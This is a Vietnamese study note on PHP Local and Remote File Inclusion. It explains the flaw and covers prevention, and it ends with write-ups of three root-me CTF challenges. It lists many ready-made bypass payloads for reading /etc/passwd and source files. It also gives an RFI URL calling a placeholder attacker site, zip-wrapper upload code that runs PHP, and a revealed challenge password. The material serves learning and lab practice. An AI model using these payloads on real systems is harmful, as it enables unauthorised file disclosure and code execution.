# task10: Local/Remote File Inclusion
## Định nghĩa:
Lỗ hổng File Inclusion cho phép tin tặc truy cập trái phép vào những tập tin nhạy cảm trên máy chủ web hoặc thực thi các tệp tin độc hại bằng cách sử dụng chức năng “include”. Lỗ hổng này xảy ra do cơ chế kiểm tra đầu vào không được thực hiện tốt, khiến tin tặc có thể khai thác và chèn các dự liệu độc hại.
## Nguyên Nhân:
Trước khi nói về chi tiết lỗ hổng, chúng ta cần hiểu sơ qua về một lời gọi hàm include(). Toàn bộ nội dung trong một file cụ thể sẽ được sao chép vào một file khác chứa lời gọi include. Phương thức này được sử dụng nhằm tránh việc code lặp và có thể sử dụng bất kì lúc nào. Lập trình viên thường sử dụng hàm include() nhằm thêm những dữ liệu, tệp tin mã nguồn dùng chung của các tệp tin trong ứng dụng. Những nơi thường được sử dụng như footers, headers, menu files … Ví dụ:
1. Một menu trang như sau
``` php=
<?php
echo <a href=”/home.asp”>HOME</a>;
     <a href=”/details.asp”>DETAILS</a>;
     <a href=”/contact.asp”>CONTACT US</a>;
?>
```
2. Menu trang này có thể được sử dụng lại trong tất cả các trang của ứng dụng bằng cách dùng hàm include()
```php=
<html>
    <body>
        <div class =”menu”>
            <?php include ‘menu.php';?>
        </div>
        <p>WELCOME</p>
    </body>
</html>
```
3. Giờ thì file menu.php đã được bao hàm trong file abc.php, bất cứ khi nào abc.php được truy cập, nội dung trong file menu.php sẽ được sao chép vào abc.php và thực thi.
Tuy nhiên vấn đề này có thể bị tin tặc khai thác và tấn công trở lại website gây những hậu quả rất nguy hiểm. Đây là 2 lỗ hổng chính rất nguy hiểm liên quan đến hàm include()

Remote file inclusion, Local file inclusion

## Khai thác
Có 2 loại lổ hổng nguy hiểm đến hàm include() đó là Remote file inclusion và Local file inclusion
### Local file inclusion
Lỗ hổng Local file inclusion nằm trong quá trình include file cục bộ có sẵn trên server. Lỗ hổng xảy ra khi đầu vào người dùng chứa đường dẫn đến file bắt buộc phải include. Khi đầu vào này không được kiểm tra, tin tặc có thể sử dụng những tên file mặc định và truy cập trái phép đến chúng, tin tặc cũng có thể lợi dụng các thông tin trả về trên để đọc được những tệp tin nhạy cảm trên các thư mục khác nhau bằng cách chèn các ký tự đặc biệt như “/”, “../”, “-“.
#### Local file inclusion trong PHP:
1. Ví dụ đường dẫn sau có thể bị tấn công:
`https://victim_site/abc.php?file=userinput.txt`
2. Giá trị của biến ‘file’ được lấy vào đoạn mã PHP dưới đây:
`<?php…include $_REQUEST[‘file’];…?>`
3. Giờ thì tin tặc sẽ đưa mã độc vào biến ‘file’ để truy cập trái phép vào file trong cùng chủ mục hoặc sử dụng kí tự duyệt chỉ mục như “../” để di chuyển đến chỉ mục khác. Ví dụ tin tặc lấy được log bằng cách cung cấp đầu vào `“/apache/logs/error.log”` hoặc `“/apache/logs/access.log”` hay việc đánh cắp dữ liệu liên quan đến tài khoản của người dùng thông qua `“../../etc/passwd”` trên hệ thống Unix.

Trong một số trường hợp đặc biệt một phần mở rộng mặc định sẽ được thêm vào thông tin được đưa lên từ trình duyệt trước khi đưa vào hàm Include(). Cách tốt nhất tránh những phần mở rộng này là sử dụng byte rỗng kết thúc “%00” để vượt qua. Đây là cách được các tin tặc sử dụng để thực hiện hành vi độc hại và truy cập bất cứ kiểu file nào.
### Remote file inclusion
RFI cho phép tin tặc include và thực thi trên máy chủ mục tiêu một tệp tin được lưu trữ từ xa. Tin tặc có thể sử dụng RFI để chạy một mã độc trên cả máy của người dùng và phía máy chủ. Ảnh hưởng của kiểu tấn công này thay đổi từ đánh cắp tạm thời session token hoặc các dữ liệu của người dùng cho đến việc tải lên các webshell, mã độc nhằm đến xâm hại hoàn toàn hệ thống máy chủ.
#### Lỗ hổng Remote file inclusion trong PHP:
PHP có nguy cơ cao bị tấn công RFI do việc sử dụng lệnh include rất nhiều và thiết đặt mặc định của server cũng ảnh hưởng một phần nào đó. Để bắt đầu chúng ta cần tìm nơi chứa file include trong ứng dụng phụ thuộc vào dữ liệu đầu vào người dùng.RFI cho phép tin tặc include và thực thi trên máy chủ mục tiêu một tệp tin được lưu trữ từ xa. Tin tặc có thể sử dụng RFI để chạy một mã độc trên cả máy của người dùng và phía máy chủ. Ảnh hưởng của kiểu tấn công này thay đổi từ đánh cắp tạm thời session token hoặc các dữ liệu của người dùng cho đến việc tải lên các webshell, mã độc nhằm đến xâm hại hoàn toàn hệ thống máy chủ.1. Một trong những nơi chứa lỗ hổng có thể như ví dụ dưới đây, giá trị của ‘testfile’ được cung cấp bởi người dùng:
`www.victim_site.com/abc.php?testfile=example`
2. Mã nguồn PHP chứa lỗ hổng:
`$test = $_REQUEST[“testfile”];Include($test.”.php”);`
3. Thông số của ‘testfile’ được lấy từ phía người dùng. Đoạn mã sẽ lấy giá trị ‘testfile’ và trực tiếp include nó vào file PHP.
4. Sau đây là ví dụ về một hướng tấn công được sử dụng đối với đoạn mã trên:
`www.victim_site.com/abc.php?test=https://www.attacker_site.com/attack_page`
File “attack_page” được bao hàm vào trang có sẵn trên máy chủ và thực thi mỗi khi trang “abc.php” được truy cập. Tin tặc sẽ đưa mã độc vào “attack_page” và thực hiện hành vi độc hại.

## Một số cách khai thác:

### Traversal sequences stripped non-recursively:

https://victim_site/home.php?file=....//....//....//etc/passwd
https://victim_site/home.php?file=....\/....\/....\/etc/passwd
http://victim_site/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

### Null byte (%00):

https://victim_site/home.php?file=../../../../etc/passwd%00

### Encoding:

https://victim_site/home.php?file=..%252f..%252f..%252fetc%252fpasswd
https://victim_site/home.php?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
https://victim_site/home.php?file=%252e%252e%252fetc%252fpasswd
https://victim_site/home.php?file=%252e%252e%252fetc%252fpasswd%00

### Path and dot truncation:

https://victim_site/home.php?file=../../../etc/passwd............[ADD MORE]
https://victim_site/home.php?file=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
https://victim_site/home.php?file=../../../etc/passwd/./././././.[ADD MORE] 
https://victim_site/home.php?file=../../../[ADD MORE]../../../../etc/passwd

### Filter bypass tricks:

https://victim_site/home.php?file=....//....//etc/passwd
https://victim_site/home.php?file=..///////..////..//////etc/passwd
https://victim_site/home.php?file=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

### Using wrappers:

https://victim_site/home.php?file=php://filter/read=string.rot13/resource=index.php
https://victim_site/home.php?file=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
https://victim_site/home.php?file=php://filter/convert.base64-encode/resource=index.php
https://victim_site/home.php?file=pHp://FilTer/convert.base64-encode/resource=index.php

## Cách phòng chống

Lỗ hổng xảy ra khi việc kiểm tra đầu vào không được chú trọng. Khuyến cáo riêng thì không nên hoặc hạn chế tới mức tối thiểu phải sử dụng các biến từ "User Input" để đưa vào hàm include() hay eval(). Trong trường hợp phải sử dụng. với các thông tin được nhập từ bên ngoài, trước khi đưa vào hàm cần được kiểm tra kỹ lưỡng

1. Chỉ chấp nhận kí tự và số cho tên file (A-Z 0-9). Blacklist toàn bộ kí tự đặc biệt không được sử dụng.
2. Giới hạn API cho phép việc include file từ một chỉ mục xác định nhằm tránh directory traversal.
Tấn công File Inclusion có thể nguy hiểm hơn cả SQL Injection do đó thực sự cần thiết phải có những biện pháp khắc phục lỗ hổng này. Kiểm tra dữ liệu đầu vào hợp lý là chìa khóa để giải quyết vấn đề.

## THỰC HÀNH:
### Local File Inclusion
khi vào website của challenge thì thấy có rất nhiều file
![](https://hackmd.io/_uploads/ByRnA7ZB2.png)
mỗi file lại đi với một URL tương ứng
URL file index.html: http://challenge01.root-me.org/web-serveur/ch16/?files=sysadm&f=index.html
![](https://hackmd.io/_uploads/ry3myEbSh.png)
URL tương ứng: http://challenge01.root-me.org/web-serveur/ch16/?files=esprit&f=artgfx

nhận thấy rằng file ở đây sẽ chỉ định folder và f sẽ chỉ định file hoặc folder con mà ta chọn.
truy cập bằng admin yêu cầu chúng ta login
![](https://hackmd.io/_uploads/HkZj1N-H3.png)
cancel thì ta nhận được dòng text: ![](https://hackmd.io/_uploads/HkVC1E-H3.png)
như vậy ta biết rằng website sử dụng backend PHP
vậy nên em đang muốn tìm được file index.php xem sao, lúc đó web trả về một thông báo lỗi: file_get_contents()
![](https://hackmd.io/_uploads/HkUgrVMrh.png)
sau khi thử fuzzing em nhận thấy rằng web không block `../` vậy nên em thử dùng Path Traversal.
![](https://hackmd.io/_uploads/ByHOoVGr3.png)

vậy là em thấy được các folder cha chứa các folder con chứa các file. Đọc index.php ở đây không có gì đặc biệt cả, vậy nên bây giờ em thử trỏ tới files=../admin để trỏ tới folder admin kia nhằm tìm đọc index.php trong đó. 
![](https://hackmd.io/_uploads/S1PGj4GB2.png)

trong admin có file index.php
![](https://hackmd.io/_uploads/B1KJ3VfH2.png)
đến đây ta thấy có một dòng users admin, và đoạn kí tự đằng sau em thử thì chính là password  
![](https://hackmd.io/_uploads/SJOq3VGBn.png)
yeahhhhh :> vậy là đã tìm được flag
user: admin
password: OpbNJ60xYpvAQU8

### Local File Inclusion - Double encoding
![](https://hackmd.io/_uploads/B100fUfB2.png)
website có 3 trang khác nhau là Home, CV và contact. 
mỗi trang đều có một URL riêng với cú pháp: http://challenge01.root-me.org/web-serveur/ch45/index.php?page=content
em thử dùng `../` thì bị phát hiện luôn. 
![](https://hackmd.io/_uploads/HkkrrUfBh.png)
tên bài là double encoding nên em chuyển từ `../` thành `%252E%252E%252F` sau 2 lần encode
đưa vào ?page=[value] thì nó báo lỗi.
![](https://hackmd.io/_uploads/B1Zz7Ffr2.png)
có thể thấy ở đây ta đã đi đúng hướng. 
giờ em muốn xem source thì em sử dụng thủ thuật wrappers với payload như sau:
http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php://filter/convert.base64-encode/resource=home
và đem đi decode 2 lần phần sau ?page ta có:
![](https://hackmd.io/_uploads/Hy4fz9fH3.png)
![](https://hackmd.io/_uploads/SJj2M9fHn.png)
vậy là khi ấn vào home thì ta sẽ được trả về nội dung của home trong file conf.inc.php vậy giờ ta thay conf vào chỗ home ở payload trên để đọc file này xem sao.
nó ra 1 chuỗi kí tự và đem đi decode ta đã được flag: 
![](https://hackmd.io/_uploads/S1_Im9GBn.png)

### Local File Inclusion - Wrappers
ở trang chủ không thể sử dụng những kĩ thuật bình thường như ../ 
thử upload file lên thì web báo chỉ nhận file JPG
![](https://hackmd.io/_uploads/HkZnx3zBn.png)
đề bài gợi ý dùng wrapper vậy nên em sử dụng payload: `php://filter/convert.base64-encode/resource=index.php`
kết quả không khả thi
sử dụng data wrapper thì bị nhận diện hacker còn dùng encode base 64 thì bị báo page name too long
![](https://hackmd.io/_uploads/By3-G3frn.png)
![](https://hackmd.io/_uploads/rygVtGhfHh.png)

vậy cách tối ưu nhất là dùng wrapper zip để đọc file:
Ta đặt tên là a.php vì nhỡ, sau đó zip file lại a.zip, rename a.jpg , sau đó upload lên server với payload:
```=php
<pre><?php show_source('index.php'); ?></pre>;

```
![](https://hackmd.io/_uploads/Sy7lEhMH2.png)
Ở đây chúng ta đã đổi extension thành .jpg  nhưng nó không quan trọng vì các byte header của file sẽ cho OS biết định dạng chính xác của file
sau khi upload file thành công thì trong source sẽ có đường dẫn đến địa chỉ của file zip đó
![](https://hackmd.io/_uploads/rkn19DXB3.png)

để ý URL: http://challenge01.root-me.org/web-serveur/ch43/index.php?page=view&id=Vh86hnKT3
ta thấy id ở đây là `Vh86hnKT3` khác với tên của file zip của ta. Sử dụng zip wrapper tuy cập đến /tmp/upload/h86hnKT3.jpg%23a, server sẽ tự concat thêm ‘.php’ cho ta để có câu request hoàn chỉnh:
payload: ?page=zip://tmp/upload/Vh86hnKT3.jpg%23a

![](https://hackmd.io/_uploads/ByFdBhzBn.png)
source code không có gì, bây giờ phải thử tìm trong folder chứa index.php vì có thể sẽ có file khác nhưng ta không Path Traversal đc, vậy nên 
sử dụng payload khác cho file php và zip nó lại gửi lại lên
```=php
<?php
$path = getcwd();
$items = scandir($path);

echo "<p>Content of $path</p>";
echo '<ul>';
foreach ($items as $item) {
    echo '<li>' . $item . '</li>';
}
echo '</ul>';
?> 

```
truy cập vào để file zip chạy được như trên và ta có được như sau: 
![](https://hackmd.io/_uploads/B1Wlw3fB2.png)
bùm. vậy là chúng ta đã tìm được ngay flag ở đây.




